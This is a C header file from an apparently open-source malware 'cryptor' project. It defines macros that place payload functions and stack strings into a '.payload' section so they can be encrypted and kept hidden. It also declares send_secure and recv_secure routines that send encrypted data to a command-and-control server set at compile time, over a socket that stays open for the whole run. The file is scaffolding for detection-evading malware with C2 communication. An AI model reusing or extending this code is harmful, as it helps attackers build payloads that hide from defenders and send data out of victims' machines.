/*
 * Copyright (C) 2020  @Qu3b411 
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

/*
 * This header file is defines all of the necessary elements of the cryptor, this should be included in 
 * any project this cryptor applies too, the imporatnt definitions and header inclusions that a cryptor 
 * 
 *
 * @Author: Qu3b411
 */
#include <stdio.h>
#include <stdlib.h>
#ifdef WIN32
	#include <winsock2.h>
	#include <windows.h>
	#include <wincrypt.h>
	#include <ws2tcpip.h>
	#include <bcrypt.h>
	#include <ntstatus.h>
	#define PLwchar_tstr(Lstr) (wchar_t[]){Lstr}
#else
	#define BYTE unsigned char
	#define ULONG unsigned long
	#define UINT64 unsigned long long
#endif

//#include <stdio.h>
#include "Cryptor.h"
/*
 * It is importatnt to the functionality of this program that all functionms
 * are declared with the appropriate attributes decorating them. the
 * following definitions will help you construct a working payload, these should
 * be used in your function definitions.
 *
 * NOTE this is not inclusive, some types are user defined, and others are OS defined
 * add definitions as necessary for your development needs. 
 */
#define PL_void			__attribute__((section(".payload"))) void
#define PL_char 		__attribute__((section(".payload"))) char 
#define PL_unsigned_char 	__attribute__((section(".payload"))) unsigned char 
#define PL_short 		__attribute__((section(".payload"))) short
#define PL_unsigned_short 	__attribute__((section(".payload"))) unsigned short
#define PL_int		 	__attribute__((section(".payload"))) int
#define PL_unsigned_int		__attribute__((section(".payload"))) unsigned int
#define PL_long		 	__attribute__((section(".payload"))) long 
#define PL_unsigned_long 	__attribute__((section(".payload"))) unsigned long
#define PL_long_long	 	__attribute__((section(".payload"))) long long
#define PL_unsigned_long_long 	__attribute__((section(".payload"))) unsigned long long
#define PL_float	 	__attribute__((section(".payload"))) float
#define PL_double	 	__attribute__((section(".payload"))) double
#define PL_long_double	 	__attribute__((section(".payload"))) long double
#define PL_		 	__attribute__((section(".payload")))

/*
 * the PLStr is a payload string, or a stack string, Payload strings
 * are defined on the stack and thus not stored as data, this means
 * when the cryptor applies the transformation to the PLStr the string
 * encrypted. This should be applied to all strings in the payload. 
 */
#define PLStr(str) (BYTE[]){str}

/*
 * This will force main to be in the payload section this is an attempt to abstract
 * a portion of the underlying functionality from the user, 
 */
__attribute__((section(".payload"))) int main();
/*
 * This function encrypts and sends data back to the defined C2 server, 
 * the IP address and port are defined durring the compilation of the program
 * on success this function returns 0, else this function returns 1;
 */
__attribute__((section(".payload"))) int send_secure(BYTE*, ULONG);
__attribute__((section(".payload"))) BYTE* recv_secure();

/*
 * Session pertanate keys must be defined globaly for the constructor to initiate/ destructor to
 * destoy all keying material appropriatly. Once innitiated communication with the sever will continue
 * fur the duration of the programs execution. 
 *
 * A large volume of these mechanisms will end up behind the sceans making it possible to do an include 
 * without seeing all of the behind the sceans logic, this will be my next step after getting the encrypted
 * comms to a working state.
 */
/*BYTE* SessionIV;
BYTE* SessionKEY;*/
#ifdef WIN32

	BCRYPT_KEY_HANDLE SessionKeyHandle;
	BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;
	/*
	 * Similar to the keying material, the socket will remain open for the duration of the runtime, 
	 * the socket is initiated in the constructore, and closed in the destructor 
	 */
	SOCKET Connection; 
#endif
